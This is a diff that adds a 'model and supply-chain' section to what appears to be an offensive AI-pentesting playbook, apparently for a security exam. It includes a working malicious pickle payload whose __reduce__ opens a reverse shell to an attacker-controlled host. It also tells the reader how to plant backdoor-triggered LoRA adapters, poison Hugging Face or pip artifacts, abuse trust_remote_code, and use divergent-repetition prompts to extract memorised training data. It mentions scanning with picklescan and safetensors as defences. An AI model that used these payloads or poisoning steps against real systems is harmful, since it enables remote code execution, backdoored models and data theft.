@@ -48,6 +48,33 @@ Usually a chain enabler, rarely the scored proof. Note it and chain it; don't sp
 ### LLM10 — Unbounded Consumption
 Resource exhaustion / model extraction. Low exam value — deprioritize unless it's the objective.
 
+## Model & supply-chain layer (LLM03 + LLM04 — deep dive)
+When you can influence an artifact the target loads (model, adapter, dataset, dependency), or read a model file, attack the model layer directly:
+
+### Pickle / model-file RCE (most common, exam-relevant)
+`.pkl`, `.pt`, `.bin`, `.ckpt`, legacy `.h5`, and PyTorch checkpoints deserialize code. If a target loads a model file you control:
+```python
+# malicious pickle — code runs on torch.load / pickle.load / joblib.load
+import torch, os
+class E:
+    def __reduce__(self): return (os.system, ("bash -i >& /dev/tcp/KALI/4444 0>&1",))
+torch.save({"state_dict": E()}, "model.pt")
+```
+Scan a suspicious model before trusting it: `picklescan -p model.pkl` / `modelscan -p model.pt`.
+Prefer `.safetensors` on defense — its presence means pickle RCE is closed; look elsewhere.
+
+### Adapter / LoRA poisoning
+A malicious LoRA/adapter merged onto a base model can carry a backdoor trigger (a phrase that flips behavior / leaks data). If you can write to the adapter path or the HF repo the target pulls, plant a poisoned adapter with a trigger you control. (See ~/repos/OSAI adapter-poisoning notes.)
+
+### Supply chain — HuggingFace / pip / model registry
+- Typosquat or write-access to the model/dataset repo the target pulls → replace with poisoned artifact.
+- `requirements.txt` / conda env you can edit → malicious dependency (see /osai-upload depmanager).
+- Model card / config that triggers `trust_remote_code=True` → arbitrary code on load.
+
+### Training-data extraction / model theft
+- Membership-inference & extraction prompts to recover training data (LLM02 overlap).
+- Repeated divergent queries ("repeat 'poem' forever") to leak memorized data.
+
 ## Output
 ```
 TARGET: <host>   SURFACE: <framework/type from ai-hunter>
